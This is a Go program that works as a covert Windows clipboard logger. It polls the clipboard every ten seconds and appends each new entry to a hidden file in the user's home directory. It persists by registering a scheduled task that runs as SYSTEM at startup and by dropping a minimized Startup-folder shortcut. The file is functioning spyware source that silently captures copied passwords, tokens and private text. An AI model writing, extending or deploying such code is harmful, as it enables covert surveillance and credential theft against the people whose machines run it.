package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"

	"github.com/atotto/clipboard"
	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

func main() {
	// Get desktop for log file first
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return
	}

	// Set up error logging
	logFile := filepath.Join(homeDir, "Desktop", "error.log")
	f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		fmt.Fprintf(f, "[INFO] %s: Starting clipboard monitor...\n", time.Now().Format(time.RFC3339))
	}

	// Initialize COM for clipboard access at startup
	if runtime.GOOS == "windows" {
		if err := ole.CoInitialize(0); err != nil {
			logError("Failed to initialize COM", err)
			return
		}
		defer ole.CoUninitialize()
	}

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	hiddenFile := filepath.Join(homeDir, ".clipboard_capture")

	// Set up persistence at boot-time (windows)
	err = setupPersistence()
	check(err)

	// Create the .clipboard_capture file
	f, err = os.OpenFile(hiddenFile, os.O_CREATE|os.O_WRONLY, 0600)
	check(err)
	f.Close()

	// Hide the .clipboard_capture file on Windows
	if runtime.GOOS == "windows" {
		err := hideFile(hiddenFile)
		check(err)
	}
	
	// Start reading clipboard
	readClipboard(ticker, hiddenFile)
}

// readClipboard polls the clipboard at intervals and stores new clipboard data to disk
func readClipboard(ticker *time.Ticker, hiddenFile string) {
	var last string

	for {
		txt, err := clipboard.ReadAll()
		if err != nil {
			logError("Failed to read clipboard", err)
			<-ticker.C
			continue
		}

		if txt != last && txt != "" {
			last = txt
			err := storeClipboard(hiddenFile, last)
			check(err)
		}
		<-ticker.C //wait for next tick
	}
}

// storeClipboard appends clipboard data to .clipboard_capture file
func storeClipboard(path, data string) error {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	check(err)

	defer f.Close()
	timestamp := time.Now().Format(time.RFC3339)
	entry := fmt.Sprintf("[%s]: %s\n", timestamp, data)
	_, err = f.WriteString(entry)
	check(err)
	return nil
}

// setupPersistence ensures 
// 1 - autostart via Task Scheduler
// 2 - drops a Startup shortcut.
func setupPersistence() error {
    if runtime.GOOS != "windows" {
        return nil
    }

    exePath, err := os.Executable()
    check(err)

    // 1 - create scheduled task
    taskName := "CaptureClipboard"
    _ = createScheduledTask(taskName, exePath)

    // 2 - create Startup shortcut as a backup path
    appData := os.Getenv("APPDATA")
    startupDir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    if _, err := os.Stat(startupDir); os.IsNotExist(err) {
        _ = os.MkdirAll(startupDir, 0755)
    }
    shortcutPath := filepath.Join(startupDir, "capture-clipboard.lnk")
    if _, err := os.Stat(shortcutPath); os.IsNotExist(err) {
        _ = createShortcut(exePath, shortcutPath)
    }
    return nil
}

func createScheduledTask(taskName, exePath string) error {
    if err := exec.Command("schtasks", "/Query", "/TN", taskName).Run(); err == nil {
        return nil
    }
    // Create: On StartUp, System privileges
    args := []string{
        "/Create",
        "/SC", "ONSTART",
        "/TN", taskName,
        "/TR", fmt.Sprintf(`"%s"`, exePath),
        "/RU", "SYSTEM",
        "/F",
    }
    return exec.Command("schtasks", args...).Run()
}

// createShortcut creates a .lnk shortcut in the Startup folder pointing to exePath
func createShortcut(exePath, shortcutPath string) error {
	ole.CoInitialize(0)
	defer ole.CoUninitialize()

	shellObj, err := oleutil.CreateObject("WScript.Shell")
	check(err)
	defer shellObj.Release()

	shell, err := shellObj.QueryInterface(ole.IID_IDispatch)
	check(err)
	defer shell.Release()

	shortcut, err := oleutil.CallMethod(shell, "CreateShortcut", shortcutPath)
	check(err)
	defer shortcut.Clear()

	sc := shortcut.ToIDispatch()
	_, err = oleutil.PutProperty(sc, "TargetPath", exePath)
	check(err)
	_, err = oleutil.PutProperty(sc, "WorkingDirectory", filepath.Dir(exePath))
	check(err)
	_, err = oleutil.PutProperty(sc, "WindowStyle", 7)
	check(err)
	_, err = oleutil.PutProperty(sc, "Description", "Clipboard Capture")
	check(err)
	_, err = oleutil.CallMethod(sc, "Save")
	check(err)

	return nil
}

// hideFile sets the hidden attribute on a file in Windows
func hideFile(path string) error {
	cmd := exec.Command("attrib", "+H", path)
	return cmd.Run()
}

// check logs error and returns it
func check(err error) error {
	if err != nil {
		logError("Error occurred", err)
		return err
	}
	return nil
}

func logError(msg string, err error) {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return
	}
	if f, err := os.OpenFile(filepath.Join(homeDir, "Desktop", "error.log"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); err == nil {
		fmt.Fprintf(f, "[ERROR] %s: %s: %v\n", time.Now().Format(time.RFC3339), msg, err)
		f.Close()
	}
}

// // summarize truncates long clipboard strings for readable output
// func summarize(s string) string {
// 	// Keep output readable: show up to 300 chars
// 	if len(s) > 300 {
// 		return s[:300] + "...(truncated)"
// 	}
// 	return s
// }

// // hideFile sets the hidden attribute on a file in Windows (used if build from Windows)
// func hideFile(path string) error{
// 	if runtime.GOOS != "windows" {
// 		path, err := syscall.UTF16PtrFromString(path)
// 		err = syscall.SetFileAttributes(path, syscall.FILE_ATTRIBUTE_HIDDEN)
// 		check(err)
// 	}
// 	return nil
// }

